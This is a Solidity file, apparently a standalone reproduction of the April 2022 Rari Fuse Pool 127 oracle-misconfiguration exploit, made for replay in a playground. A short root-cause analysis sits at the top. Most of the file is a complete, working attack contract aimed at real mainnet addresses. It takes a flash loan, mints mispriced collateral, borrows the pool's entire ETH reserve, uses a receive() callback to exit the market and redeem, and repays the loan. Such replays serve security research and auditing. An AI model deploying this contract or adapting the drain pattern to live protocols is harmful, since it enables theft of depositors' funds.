// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

/*
 * DEEP MANUAL ANALYSIS: 2022-04-Rari (Fuse Pool 127 Oracle Misconfiguration)
 *
 * VULNERABILITY:
 *   Comptroller blindly trusts oracle.getUnderlyingPrice without any range,
 *   deviation, or feed-correctness check.
 *   - In getHypotheticalAccountLiquidityInternal the price directly scales
 *     collateral value: tokensToDenom = collateralFactor * exchangeRate * oraclePrice
 *   - borrowAllowed only does `if (oracle.getUnderlyingPrice(...) == 0) PRICE_ERROR`
 *   - Pool 127's admin wiring mapped fUSDC's price feed to the ETH/USD aggregator.
 *   - Result: minting real USDC produced ~3526x fictitious collateral value,
 *     allowing borrow of the pool's entire ETH cash reserve.
 *
 * The bug is NOT inside the cToken (mint/borrow are standard Compound v2);
 * it is the missing defensive layer around the pluggable PriceOracle result.
 */

 // Synthetic standalone exploit for the EVM Playground (2022-04-Rari).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// `ContractTest`: `testExploit()` triggers a Balancer flash loan whose callback
// `receiveFlashLoan(...)` lives on the test itself, and `receive()` calls back
// into the Comptroller. There is no standalone exploit contract to deploy. This
// file is a faithful, self-contained copy of that inline attack so the playground
// can deploy it and record `run()`. Logic and constants are copied verbatim from
// test/Rari_exp.sol (Pool 127 leg of the Rari/Fei Fuse incident, block 14,684,813).
//
// Root cause: Fuse Pool 127's MasterPriceOracle was mis-wired to price the fUSDC
// market off the ETH/USD Chainlink feed (~$3,526) instead of a USDC/USD source,
// so a borrower could over-collateralise with cheap stablecoins and borrow the
// pool's real ETH reserve. The Comptroller's liquidity math blindly trusts the
// oracle — no sanity bound, no cross-check.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ICErc20Delegate {
    function accrueInterest() external returns (uint256);
    function mint(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ICEtherDelegate {
    function borrow(uint256) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface IUnitroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
    function exitMarket(address) external returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

// Minimal interface for the Fuse Pool 127 Comptroller (Unitroller implementation)
// so the vulnerability locator can anchor on its verified source.
interface IComptroller {
    function getHypotheticalAccountLiquidity(address account, address cTokenModify, uint256 redeemTokens, uint256 borrowAmount)
        external
        view
        returns (uint256, uint256, uint256);
}

contract RariFuseOracleDrain {
    address constant ATTACKER = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496;

    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ICEtherDelegate constant FETH_127 = ICEtherDelegate(payable(0x26267e41CeCa7C8E0f143554Af707336f27Fa051));
    ICErc20Delegate constant FUSDC_127 = ICErc20Delegate(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47);
    IUnitroller constant RARI_COMPTROLLER = IUnitroller(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    // Flash-loan 150,000,000 USDC from the Balancer Vault (zero-fee). The callback
    // below does the mint → enterMarkets → borrow → unwind → repay.
    function run() external {
        // EXPLOIT STEP 1: Obtain 150M USDC via zero-fee flash loan.
        // Capital is only needed transiently to manufacture the mis-priced collateral.
        address[] memory tokens = new address[](1);
        tokens[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 150_000_000 * 10 ** 6;
        VAULT.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(address[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData) external {
        tokens;
        amounts;
        feeAmounts;
        userData;

        USDC.approve(address(FUSDC_127), type(uint256).max);
        FUSDC_127.accrueInterest();

        // EXPLOIT STEP 2: Mint 15M USDC into the fUSDC market.
        // The VULNERABILITY causes the Comptroller to treat this as
        // ~$52B of collateral (15M * 3526) because price feed was wrong.
        FUSDC_127.mint(15_000_000_000_000);

        address[] memory ctokens = new address[](1);
        ctokens[0] = address(FUSDC_127);
        RARI_COMPTROLLER.enterMarkets(ctokens);

        // EXPLOIT STEP 3: Borrow exactly the pool's full ETH cash (1977 ETH).
        // getHypotheticalAccountLiquidityInternal reports surplus because of
        // the 3526x oraclePrice multiplier on the fUSDC collateral.
        // borrowAllowed returns NO_ERROR; borrowFresh drains the cash.
        FETH_127.borrow(1977 ether);

        FUSDC_127.approve(address(FUSDC_127), type(uint256).max);

        // EXPLOIT STEP 4 (in receive): exitMarket so redeem does not see the borrow.
        FUSDC_127.redeemUnderlying(15_000_000_000_000);

        uint256 usdcBalance = USDC.balanceOf(address(this));
        USDC.transfer(address(VAULT), usdcBalance);
    }

    // The borrowed 1,977 ETH is delivered to this contract via a plain ETH transfer;
    // its receive() fires, which removes fUSDC from the collateral set (exitMarket)
    // so the subsequent redeemUnderlying does not trip a shortfall from the freshly
    // created ETH borrow.
    //
    // EXPLOIT STEP (receive callback): exitMarket(fUSDC) is the critical
    // sequencing move that makes the redeem succeed after the borrow.
    receive() external payable {
        RARI_COMPTROLLER.exitMarket(address(FUSDC_127));
    }
}
